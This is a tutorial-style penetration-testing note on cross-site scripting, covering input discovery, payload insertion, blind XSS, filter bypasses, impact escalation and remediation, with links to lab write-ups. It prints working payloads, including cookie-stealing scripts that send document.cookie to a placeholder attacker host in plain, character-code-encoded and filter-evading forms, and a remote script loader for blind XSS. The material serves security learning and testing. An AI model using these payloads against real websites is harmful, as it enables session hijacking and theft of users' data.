# Cross-site scripting (XSS)

* An XSS vulnerability is an input validation error. 
* All the input data in an application could be susceptible to XSS or other input validation vulnerabilities. It is important to review not just the fields in forms, but all the inputs, including the application control flow parameters.
* Use a HTTP proxy to analyse the HTTP request and avoid client-side security controls. All the input validation functions need to be developed in the backend.
* Try different types of encodings and payload variants. Most of the time, developers use black and white lists to prevent XSS vulnerabilities. These controls can sometimes be avoided. It just needs time and persistence.

## Steps

1. Look for user input opportunities on the application. When user input is stored and used to construct a web page later, test the input field for stored XSS. If user input in a URL gets reflected back on the resulting web page, test for reflected and DOM XSS.
2. Insert XSS payloads into the user input fields you’ve found. Insert payloads from lists online, a polyglot payload, or a generic test string.
3. Confirm the impact of the payload by checking whether your browser runs your JavaScript code. Or in the case of a blind XSS, see if you can make the victim browser generate a request to your server.
4. If you can’t get any payloads to execute, try bypassing XSS protections.
5. Automate the XSS hunting process.
6. Consider the impact of the XSS you’ve found: who does it target? How many users can it affect? And what can you achieve with it? Can you escalate the attack by using what you’ve found?
7. Create an XSS report.

## Look for input opportunities

Turn on your proxy’s traffic interception and modify the request before forwarding it to the server. In Burp, you can edit the request directly in the Proxy tab. After you’re done editing, click Forward to forward the request to the server.

If you’re attempting stored XSS, search for places where input gets stored by the server and later displayed to the user, including comment fields, user profiles, and blog posts. The types of user input that are most often reflected back to the user are forms, search boxes, and name and username fields in sign-ups. Sometimes drop-down menus or numeric fields can allow you to perform XSS, because even if you can’t enter your payload on your browser, your Zap or Burp proxy might let you insert it directly into the request. 

If you’re hoping to find reflected and DOM XSS, look for user input in URL parameters, fragments, or pathnames that get displayed to the user. A good way to do this is to insert a custom string into each URL parameter and check whether it shows up in the returned page. Insert the custom string into every user-input opportunity you can find. Then, when you view the page in the browser, search the page’s source code for it (View Source) by using your browser’s page-search functionality (usually CTRL-F). This should give an idea of which user input fields appear in the resulting web page.

Note: There is JS code that is using some data which can be controlled unsafely, like `location.href`. This can be used to execute arbitrary JavaScript code in DOM based XSS.

## Insert payloads

Once user-input opportunities present in an application have been identified, start entering a test XSS payload at the discovered injection points. The simplest payload to test with is an alert box:

    <script>alert('Hello World');</script>

Most websites nowadays implement some sort of XSS protection on their input fields, and this payload will not work. A simple payload like this one is more likely to work on IoT or embedded applications that do not use the latest frameworks.

### More than script tag

Some HTML attributes allow for specifying a script to run if certain conditions are met. For example, the `onload` event attribute runs a specific script after the HTML element has loaded:

    <img onload=alert('The image has been loaded!') src="example.png">

The `onclick` event attribute specifies the script to be executed when the element is clicked, and `onerror` specifies the script to run in case an error occurs loading the element. If you can insert code into these attributes, or even add a new event attribute into an HTML tag, you can create an XSS.

Another way of achieving XSS is through special URL schemes, like `javascript:` and `data:`. The `javascript:` URL scheme allows for executing JavaScript code specified in the URL. For example, entering this URL will cause an alert box with the text "Hello World" to appear:

    javascript:alert('Hello World')

Data URLs that use the `data:` scheme, allow for embedding small files in a URL:

    data:text/html;base64,PHNjcmlwdD5hbGVydCgnSGVsbG8gV29ybGQnKTwvc2NyaXB0Pg=="

`PHNjcmlwdD5hbGVydCgnSGVsbG8gV29ybGQnKTwvc2NyaXB0Pg==` is the base64 encoded form of `<script>alert('Hello World')</script>`.

Documents contained within `data:` URLs do not need to be base64 encoded, but base64 encoding can often help you bypass XSS filters. There are many more ways to execute JavaScript code to bypass XSS protection. See the cheatsheets.

### Closing out HTML tags

    <img src="USER_INPUT">

The payload has to include the ending of an `img` tag before the JavaScript:

    "/><script>location="http://attacker.com";</script>

Injected, the resulting HTML will look like this:

    <img src=""/><script>location="http://attacker.com";</script>">

If a payload is not working, check whether the payload caused syntax errors in the returned document, by inspecting the returned document in your proxy and look for unclosed tags or other syntax issues.

### Improving effectiveness

Another way of approaching manual XSS testing is to insert an XSS polyglot, a type of XSS payload that executes in multiple contexts.

Example:

    javascript:"/*\"/*`/*' /*</template>
    </textarea></noembed></noscript></title>
    </style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>

Another way of testing for XSS more efficiently is to use generic test strings instead of XSS payloads. Insert a string of special HTML characters often used in XSS payloads, such as the following: >'<"//:=;!--. Take note of which ones the application escapes and which get rendered directly. Then construct test XSS payloads from the characters that you know the application isn’t properly sanitizing.

## Blind XSS

Blind XSS flaws are harder to detect; since you can’t detect them by looking for reflected input, you can’t test for them by trying to generate an alert box. Instead, try making the victim’s browser generate a request to a server you own. For example, you can submit the following payload, which will make the victim’s browser request the page `/xss` on your server:

    <script src='http://YOUR_SERVER_IP/xss'></script>

Monitor the server logs to see if anyone requests that page. If you see a request to the path `/xss`, a blind XSS has been triggered. [XSS Hunter](https://xsshunter.com/features) can automate this process.

## Confirm the impact

Check for the payload on the destination page. 

Sites might also use user input to construct something other than the next returned web page. Your input could show up in future web pages, email, and file portals. 

A time delay also might occur between when the payload is submitted and when the user input is rendered. This situation is common in log files and analytics pages. If you’re targeting these, the payload might not execute until later, or in another user’s account.

Some XSS payloads will execute in certain contexts, such as when an admin is logged in or when the user actively clicks, or hovers over, certain HTML elements. Confirm the impact of the XSS payload by browsing to the necessary pages and performing those actions.

## Bypassing protections

Most applications implement some sort of XSS protection in their input fields. Common is using a blocklist to filter out dangerous expressions that might be indicative of XSS. This type of protection can be bypassed.

Alternative JavaScript syntax: Some applications will sanitize `script` tags in user input. If that is the case, try executing XSS that does not use a `script` tag. Instead of:

    <img src="/><script>alert('Hello World');</script>"/>

Use:

    <img src="odear" onerror="alert('Hello World');"/>

And this snippet will create a `Click me!` link that will generate an alert box when clicked:

    <a href="javascript:alert('Hello World')>Click me!</a>"

Capitalisation and encoding: You can also try mixing different encodings and capitalisations to confuse the XSS filter. If the filter filters for only the string "script", capitalise some letters in the payload. Browsers often parse HTML code permissively and will allow for minor syntax issues like capitalisation, and as a result, this will not affect how the script tag is interpreted:

    <scrIPT>location='http://attacker_server_ip/c='+document.cookie;</scrIPT>

If the application filters special HTML characters, like single and double quotes, you can not write any strings into your XSS payload directly.

You can try using the JavaScript `fromCharCode()` function to create the string you need. For example, this piece of code is equivalent to the string `http://attacker_server_ip/?c=`:

    String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107,
    101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112, 47, 63, 99, 61)

And construct an XSS payload without quotes:

    <scrIPT>location=String.fromCharCode(104, 116, 116, 112, 58, 47,
    47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118,
    101, 114, 95, 105, 112, 47, 63, 99, 61)+document.cookie;</scrIPT>

Use this code to translate an exploit string to an ASCII number sequence (using an online JavaScript editor, like [js.do](https://js.do/)):

    <script>
    function ascii(c){
        return c.charCodeAt();
    }
    encoded = "INPUT_STRING".split("").map(ascii);
    document.write(encoded);
    </script>

For example, translating the script with payload `http://attacker_server_ip/?c=`:

    <script>
    function ascii(c){
    return c.charCodeAt();
    }
    encoded = "http://attacker_server_ip/?c=".split("").map(ascii);
    document.write(encoded);
    </script>

This JavaScript code should print out `104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112, 47, 63, 99, 61`. You can then use it to construct the payload by using the `fromCharCode()` method.

Filter Logic Errors: You can also exploit any errors in the filter logic. For example, sometimes applications remove all `script` tags in the user input to prevent XSS, but do it only once. If that’s the case, you can use a payload like this:

    <scrip<script>t>
    location='http://attacker_server_ip/c='+document.cookie;
    </scrip</script>t>

The filter won’t recognise those broken tags as legitimate, but once the filter removes the intact tags from this payload, the rendered input becomes a perfectly valid piece of JavaScript code:

    <script>location='http://attacker_server_ip/c='+document.cookie;</script>

## Escalation

XSS attacks can result in:

* Hijacking a user’s session, using credentials to access other sites or redirect the user to unintended websites.
* Altering website pages or inserting sections into a web page.
* Executing scripts to extract sensitive information from cookies or databases.

The impact varies. The type of XSS determines the number of users who could be affected. 

* Stored XSS on a public forum can realistically attack anyone who visits that forum page, so stored XSS is considered the most severe. 
* Reflected or DOM XSS can affect only users who click the malicious link.
* Self-XSS requires a lot of user interaction and social engineering to execute.

The identities of the affected users matter too. If a stored XSS vulnerability is on a site’s server logs, the XSS can affect system administrators and allow attackers to take over their sessions. Since the affected users are accounts of high privilege, the XSS can compromise the integrity of the entire application. You might gain access to customer data, internal files, and API keys. You might even escalate the attack into RCE by uploading a shell or execute scripts as the admin.

* In a brochure-ware application, where all users are anonymous and all information is public, the impact will often be minimal.
* In an application holding sensitive data, such as banking transactions, emails, or healthcare records, the impact will usually be serious.
* If the compromised user has elevated privileges within the application, then the impact will generally be critical, allowing the attacker to take full control of the vulnerable application and compromise all users and their data.

## Portswigger lab writeups

* [Open redirection techniques](redirects.md)
* [Reflected XSS into HTML context with nothing encoded](../burp/xss/1.md)
* [Stored XSS into HTML context with nothing encoded](../burp/xss/2.md)
* [DOM XSS in document.write sink using source location.search](../burp/xss/3.md)
* [DOM XSS in innerHTML sink using source location.search](../burp/xss/4.md)
* [DOM XSS in jQuery anchor href attribute sink using location.search source](../burp/xss/5.md)
* [DOM XSS in jQuery selector sink using a hashchange event](../burp/xss/6.md)
* [Reflected XSS into attribute with angle brackets HTML-encoded](../burp/xss/7.md)
* [Stored XSS into anchor href attribute with double quotes HTML-encoded](../burp/xss/8.md)
* [Reflected XSS into a JavaScript string with angle brackets HTML encoded](../burp/xss/9.md)
* [DOM XSS in document.write sink using source location.search inside a select element](../burp/xss/10.md)
* [DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded](../burp/xss/11.md)
* [Reflected DOM XSS](../burp/xss/12.md)
* [Stored DOM XSS](../burp/xss/13.md)
* [Exploiting cross-site scripting to steal cookies](../burp/xss/14.md)
* [Exploiting cross-site scripting to capture passwords](../burp/xss/15.md)
* [Exploiting XSS to perform CSRF](../burp/xss/16.md)
* [Reflected XSS into HTML context with most tags and attributes blocked](../burp/xss/17.md)
* [Reflected XSS into HTML context with all tags blocked except custom ones](../burp/xss/18.md)
* [Reflected XSS with some SVG markup allowed](../burp/xss/19.md)
* [Reflected XSS in canonical link tag](../burp/xss/20.md)
* [Reflected XSS into a JavaScript string with single quote and backslash escaped](../burp/xss/21.md)
* [Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped](../burp/xss/22.md)
* [Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped](../burp/xss/23.md)
* [Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped](../burp/xss/24.md)
* [Reflected XSS with event handlers and href attributes blocked](../burp/xss/25.md)
* [Reflected XSS in a JavaScript URL with some characters blocked](../burp/xss/26.md)
* [Reflected XSS with AngularJS sandbox escape without strings](../burp/xss/27.md)
* [Reflected XSS with AngularJS sandbox escape and CSP](../burp/xss/28.md)
* [Reflected XSS protected by very strict CSP, with dangling markup attack](../burp/xss/29.md)
* [Reflected XSS protected by CSP, with CSP bypass](../burp/xss/30.md)

## Remediation

* Make sure all developers, website designers, and QA teams are aware of the methods hackers use to exploit vulnerabilities and provide guidelines and best practices for coding. This includes proper escaping/encoding techniques for the application environment (JavaScript, HTML, etc.).
* Sanitise input: Whether for internal web pages or public websites, never trust the validity of user input data. Screen and validate any data fields, especially if it will be included as HTML output.
* Use or implement software that scans code for vulnerabilities, including cross-site scripting.
* Content Security Policy: Use Content Security Policy (CSP) to define what a website can do. XSS can be blocked entirely (by blocking all in-line scripts) or be reduced to much lower risk.

## Resources

* [Portswigger: Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)
* [OWASP: Cross Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
* [OWASP: Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
* [XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
* [Portswigger XSS cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet/)

